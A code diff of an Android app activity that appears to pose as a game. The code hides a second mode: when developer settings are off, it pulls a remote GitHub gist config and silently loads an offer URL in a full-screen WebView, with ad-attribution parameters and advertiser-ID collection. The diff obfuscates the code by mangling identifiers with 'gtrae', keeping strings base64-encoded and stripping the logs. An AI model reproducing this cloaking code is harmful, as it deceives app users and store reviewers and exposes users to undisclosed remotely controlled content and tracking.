@@ -1,7 +1,7 @@
 package com.gtrae.wfol;
 
 
-import static com.gtrae.wfol.Parser.decode;
+import static com.gtrae.wfol.Parsergtrae.degtraecode;
 
 import android.app.Activity;
 import android.content.ComponentName;
@@ -41,79 +41,78 @@ import okhttp3.Response;
 
 
 public class GW extends AppCompatActivity {
-    public static Context MAcontext;
-    public static String strDeep;
-    public static final String GistLink = "https://gist.githubusercontent.com/KRKRKRS/3977bc193036e4ee8ed08cfa1acb3c8d/raw/Great%2520Wolf%2520%257C%2520com.gtrae.wfol/";
-    public static final String AFKey = "Q0NpRmhESjVaYnlMYm5Ybk1zcGN3Vg==";
-    public static final String OneSignalId = "OGFmZGMyZDItMjE3NC00N2MyLWE0ZWYtNTZiMGUzMDY2NThh";
-    private boolean binded;
-    private MyService myService;
-    private ProgressBar progressBar;
-    private WebView webView;
-    private String link;
-    private ValueCallback<Uri[]> myFilePathCallback;
-    private SharedPreferences sPrefs;
-    private String offer;
-    private String fb_Id;
-    public static final String URL_SHARED_PREF = "TEFTVF9XZWJWaWV3X1VSTA==";
-    public static final int INPUT_FILE_REQUEST_CODE = 1;
-    public static String keyDefault;
-    public static String statusAppsFlyer;
-    public static String strAppsFlyer;
-    public static String AppsFl_Id;
-    public static String AD_ID;
+    public static Context MAcontgtraeext;
+    public static String strDegtraeep;
+    public static final String GistLigtraenk = "https://gist.githubusercontent.com/KRKRKRS/3977bc193036e4ee8ed08cfa1acb3c8d/raw/Great%2520Wolf%2520%257C%2520com.gtrae.wfol/";
+    public static final String AFKgtraeey = "Q0NpRmhESjVaYnlMYm5Ybk1zcGN3Vg==";
+    public static final String OneSigngtraealId = "OGFmZGMyZDItMjE3NC00N2MyLWE0ZWYtNTZiMGUzMDY2NThh";
+    private boolean bigtraended;
+    private MyService mySegtraervice;
+    private ProgressBar progtraegressBar;
+    private WebView webViegtraew;
+    private String ligtraenk;
+    private ValueCallback<Uri[]> myFilePathCallgtraeback;
+    private SharedPreferences sPrgtraeefs;
+    private String ogtraeffer;
+    private String fbgtrae_Id;
+    public static final String URL_SHARED_PgtraeREF = "TEFTVF9XZWJWaWV3X1VSTA==";
+    public static final int INPUT_FILE_REQgtraeUEST_CODE = 1;
+    public static String keyDefgtraeault;
+    public static String statusgtraeAppsFlyer;
+    public static String strAppgtraesFlyer;
+    public static String AppsgtraeFl_Id;
+    public static String ADAD_ID_ID;
 
 
-    ServiceConnection myServiceConnection = new ServiceConnection() {
+    ServiceConnection myServicegtraeConnection = new ServiceConnection() {
         @Override
         public void onServiceConnected(ComponentName componentName, IBinder iBinder) {
             MyService.LocalBinder binder = (MyService.LocalBinder) iBinder;
-            myService = binder.getService();
-            binded = true;
+            mySegtraervice = binder.getService();
+            bigtraended = true;
         }
 
         @Override
         public void onServiceDisconnected(ComponentName componentName) {
-            binded = false;
+            bigtraended = false;
         }
     };
 
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
-        MAcontext = this;
+        MAcontgtraeext = this;
         getWindow().addFlags(1024);
         OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);
         OneSignal.initWithContext(this);
-        OneSignal.setAppId(decode(GW.OneSignalId));
+        OneSignal.setAppId(degtraecode(GW.OneSigngtraealId));
 
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-        progressBar = findViewById(R.id.progressBar);
+        progtraegressBar = findViewById(R.id.progressBar);
 
         if (devModeOff()) {
 
             Intent intent = new Intent(this, MyService.class);
-            this.bindService(intent, myServiceConnection, Context.BIND_AUTO_CREATE);
+            this.bindService(intent, myServicegtraeConnection, Context.BIND_AUTO_CREATE);
             new Handler().postDelayed(new Runnable() {
                 @Override
                 public void run() {
-                    if (binded)
-                        myService.getStatusAppsFlyerAndAppsId();
+                    if (bigtraended)
+                        mySegtraervice.getStatusAppsFlyerAndAppsId();
                 }
             }, 1000);
 
-            webView = findViewById(R.id.webView);
-            setWebView(webView);
-            OkHttpClient client = new OkHttpClient();
-            Request request = new Request.Builder().get().url(GW.GistLink).build();
-            Call call = client.newCall(request);
+            webViegtraew = findViewById(R.id.webView);
+            setWebViegtraew(webViegtraew);
+            OkHttpClient cliengtraet = new OkHttpClient();
+            Request reqgtraeuest = new Request.Builder().get().url(GW.GistLigtraenk).build();
+            Call call = cliengtraet.newCall(reqgtraeuest);
 
             call.enqueue(new Callback() {
                 @Override
                 public void onFailure(Call call, IOException e) {
-                    Log.i("MyApp", "OkHttp fail");
-                    goToGame();
+                    goTogtraeGame();
                 }
 
                 @Override
@@ -122,108 +121,104 @@ public class GW extends AppCompatActivity {
                     runOnUiThread(new Runnable() {
                         @Override
                         public void run() {
-                            String[] params = url.split("\\|");
-                            offer = params[0];
-                            keyDefault = params[1];
-                            fb_Id = params[2];
+                            String[] pargtraeams = url.split("\\|");
+                            ogtraeffer = pargtraeams[0];
+                            keyDefgtraeault = pargtraeams[1];
+                            fbgtrae_Id = pargtraeams[2];
 
-                            doFacebook(fb_Id, GW.this);
+                            doFacgtraeebook(fbgtrae_Id, GW.this);
 
-                            sPrefs = getSharedPreferences("bXlXZWJWaWV3UHJlZnM=", Context.MODE_PRIVATE);
-                            link = sPrefs.getString(URL_SHARED_PREF, null);
+                            sPrgtraeefs = getSharedPreferences("bXlXZWJWaWV3UHJlZnM=", Context.MODE_PRIVATE);
+                            ligtraenk = sPrgtraeefs.getString(URL_SHARED_PgtraeREF, null);
 
-//                            if (link != null) {
-//                                webView.loadUrl(link);
-//                            } else {
-                            // TODO handler
-                            new Handler().postDelayed(new Runnable() {
-                                @Override
-                                public void run() {
-                                    GW.this.unbindService(myServiceConnection);
-                                    startWebView(offer);
-                                }
-                            }, 5000);
-//                            }
+                            if (ligtraenk != null) {
+                                webViegtraew.loadUrl(ligtraenk);
+                            } else {
+                                // TODO handler
+                                new Handler().postDelayed(new Runnable() {
+                                    @Override
+                                    public void run() {
+                                        GW.this.unbindService(myServicegtraeConnection);
+                                        startWebgtraeView(ogtraeffer);
+                                    }
+                                }, 5000);
+                            }
                         }
                     });
                 }
             });
         } else {
-            goToGame();
+            goTogtraeGame();
         }
     }
 
-    private void goToGame() {
+    private void goTogtraeGame() {
         startActivity(new Intent(this, MenuActivity.class));
         finish();
     }
 
-    void startWebView(String link) {
-        if (statusAppsFlyer != null && statusAppsFlyer.equals(decode("Tm9uLW9yZ2FuaWM="))) {
-            String url = link + strAppsFlyer;
-            Log.i("MyApp", "non-organic - " + url);
-            webView.loadUrl(url);
-        } else if (strDeep != null) {
-            String url = link + strDeep;
-            webView.loadUrl(url);
-            Log.i("MyApp", "deepLink - " + url);
+    void startWebgtraeView(String link) {
+        if (statusgtraeAppsFlyer != null && statusgtraeAppsFlyer.equals(degtraecode("Tm9uLW9yZ2FuaWM="))) {
+            String ugtraerl = link + strAppgtraesFlyer;
+            webViegtraew.loadUrl(ugtraerl);
+        } else if (strDegtraeep != null) {
+            String urgtrael = link + strDegtraeep;
+            webViegtraew.loadUrl(urgtrael);
         } else {
-            if (keyDefault.equals("NO")) {
-                goToGame();
+            if (keyDefgtraeault.equals(degtraecode("Tk8="))) {
+                goTogtraeGame();
             } else {
-                String url = new Parser().parseOrganic(link);
-                Log.i("MyApp", "organic - " + url);
-                webView.loadUrl(url);
+                String urgtrael = new Parsergtrae().parseOgtraerganic(link);
+                webViegtraew.loadUrl(urgtrael);
             }
         }
     }
 
     @Override
     public void onBackPressed() {
-        webView.goBack();
+        webViegtraew.goBack();
     }
 
     @Override
     protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
-        if (requestCode != INPUT_FILE_REQUEST_CODE || myFilePathCallback == null) {
+        if (requestCode != INPUT_FILE_REQgtraeUEST_CODE || myFilePathCallgtraeback == null) {
             super.onActivityResult(requestCode, resultCode, data);
             return;
         }
         if (resultCode == Activity.RESULT_OK & data != null) {
             String dataString = data.getDataString();
-            Uri[] result = new Uri[]{Uri.parse(dataString)};
-            myFilePathCallback.onReceiveValue(result);
-            myFilePathCallback = null;
+            Uri[] resgtraeult = new Uri[]{Uri.parse(dataString)};
+            myFilePathCallgtraeback.onReceiveValue(resgtraeult);
+            myFilePathCallgtraeback = null;
         }
     }
 
 
     private boolean devModeOff() {
-        int devInt = android.provider.Settings.Secure.getInt(getApplicationContext().getContentResolver(),
+        int devgtraeInt = android.provider.Settings.Secure.getInt(getApplicationContext().getContentResolver(),
                 android.provider.Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0);
-        return devInt == 0;
+        return devgtraeInt == 0;
     }
 
 
-
-    class MyWebChromeClient extends WebChromeClient {
+    class MyWebChromegtraeClient extends WebChromeClient {
         @Override
         public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback, FileChooserParams fileChooserParams) {
-            myFilePathCallback = filePathCallback;
-            startActivityForResult(new Intent(Intent.ACTION_CHOOSER).putExtra(Intent.EXTRA_INTENT, new Intent(Intent.ACTION_GET_CONTENT).addCategory(Intent.CATEGORY_OPENABLE).setType(decode("aW1hZ2UvKg=="))), INPUT_FILE_REQUEST_CODE);
+            myFilePathCallgtraeback = filePathCallback;
+            startActivityForResult(new Intent(Intent.ACTION_CHOOSER).putExtra(Intent.EXTRA_INTENT, new Intent(Intent.ACTION_GET_CONTENT).addCategory(Intent.CATEGORY_OPENABLE).setType(degtraecode("aW1hZ2UvKg=="))), INPUT_FILE_REQgtraeUEST_CODE);
             return true;
         }
     }
 
-    class MyWebViewClient extends WebViewClient {
+    class MyWebViewgtraeClient extends WebViewClient {
         @Override
         public void onPageStarted(WebView view, String url, Bitmap favicon) {
             super.onPageStarted(view, url, favicon);
-            webView.setVisibility(View.VISIBLE);
-            progressBar.setVisibility(ProgressBar.INVISIBLE);
+            webViegtraew.setVisibility(View.VISIBLE);
+            progtraegressBar.setVisibility(ProgressBar.INVISIBLE);
 
-            if (url.contains(decode("NDA0"))) {
-                goToGame();
+            if (url.contains(degtraecode("NDA0"))) {
+                goTogtraeGame();
                 finish();
             }
         }
@@ -231,14 +226,14 @@ public class GW extends AppCompatActivity {
         @Override
         public void onPageFinished(WebView view, String url) {
             super.onPageFinished(view, url);
-            SharedPreferences.Editor editor = sPrefs.edit();
-            editor.putString(URL_SHARED_PREF, url);
+            SharedPreferences.Editor editor = sPrgtraeefs.edit();
+            editor.putString(URL_SHARED_PgtraeREF, url);
             editor.apply();
         }
     }
 
 
-    private void doFacebook(String fbId, GW mainActivity) {
+    private void doFacgtraeebook(String fbId, GW mainActivity) {
         FacebookSdk.setApplicationId(fbId);
         FacebookSdk.setAdvertiserIDCollectionEnabled(true);
         FacebookSdk.sdkInitialize(mainActivity.getApplicationContext());
@@ -249,14 +244,13 @@ public class GW extends AppCompatActivity {
 
         AppLinkData.fetchDeferredAppLinkData(mainActivity.getApplication(), appLinkData -> {
                     String deepLink = appLinkData.getTargetUri().getQuery();
-                    Parser parserStr = new Parser();
-                    strDeep = parserStr.parse(deepLink);
-                    Log.i("MyApp", "deep in FB- " + strDeep);
+                    Parsergtrae parsergtraeStr = new Parsergtrae();
+                    strDegtraeep = parsergtraeStr.pagtraerse(deepLink);
                 }
         );
     }
 
-    private void setWebView(WebView webViewetgpy) {
+    private void setWebViegtraew(WebView webViewetgpy) {
         webViewetgpy.getSettings().setJavaScriptEnabled(true);
         webViewetgpy.getSettings().setAppCacheEnabled(true);
         webViewetgpy.getSettings().setDomStorageEnabled(true);
@@ -278,7 +272,7 @@ public class GW extends AppCompatActivity {
         webViewetgpy.getSettings().setAllowFileAccess(true);
         webViewetgpy.getSettings().setRenderPriority(WebSettings.RenderPriority.HIGH);
         webViewetgpy.getSettings().setEnableSmoothTransition(true);
-        webViewetgpy.setWebChromeClient(new MyWebChromeClient());
-        webViewetgpy.setWebViewClient(new MyWebViewClient());
+        webViewetgpy.setWebChromeClient(new MyWebChromegtraeClient());
+        webViewetgpy.setWebViewClient(new MyWebViewgtraeClient());
     }
 }
